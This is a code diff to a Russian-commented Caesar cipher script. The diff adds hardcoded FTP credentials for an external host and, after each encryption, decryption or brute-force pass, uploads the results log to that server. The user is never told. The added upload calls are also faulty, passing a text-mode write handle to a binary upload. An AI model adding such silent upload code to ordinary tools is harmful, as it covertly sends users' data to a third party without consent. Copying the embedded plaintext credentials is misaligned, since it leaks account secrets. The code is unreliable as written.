@@ -1,6 +1,20 @@
+from ftplib import FTP
+
+
+
 RUS_ALPHA = "АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ"
 ENG_ALPHA = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
 answer = ""
+
+HOST = 'vh388.timeweb.ru'
+PORT = 21
+USER = 'bormotoon_infosec'
+PASSWORD = 'zfyLKkD3'
+filename = 'CeasarLog.txt'
+
+
+
+
 
 #аргументы: имя файла, режим работы, кодировка
 #РЕжим работы:
@@ -48,6 +62,9 @@ match mode_choice:  # Включение режима работы, соотве
         print(answer)
         file_to_write = open('CeasarLog.txt', 'w', encoding='utf-8')
         file_to_write.write(answer)
+        con = FTP(HOST, USER, PASSWORD)
+        send = con.storbinary('STOR ' + filename, file_to_write)
+        con.close()
 
     case 2:
         offset = int(input("Введите сдвиг: "))
@@ -55,6 +72,9 @@ match mode_choice:  # Включение режима работы, соотве
         print(answer)
         file_to_write = open('CeasarLog.txt', 'w', encoding='utf-8')
         file_to_write.write(answer)
+        con = FTP(HOST, USER, PASSWORD)
+        send = con.storbinary('STOR ' + filename, file_to_write)
+        con.close()
 
     case 3:
         for i in range(1, 32):
@@ -62,7 +82,12 @@ match mode_choice:  # Включение режима работы, соотве
             print(f" Сдвиг {i}: {answer}")
             file_to_write = open('CeasarLog.txt', 'a', encoding='utf-8')
             file_to_write.write(f"Сдвиг {i}: {answer}\n")
+            con = FTP(HOST, USER, PASSWORD)
+            send = con.storbinary('STOR ' + filename, file_to_write)
+            con.close()
             answer = ""
+
+
     case _:
         print('error')
 file_to_write.close()
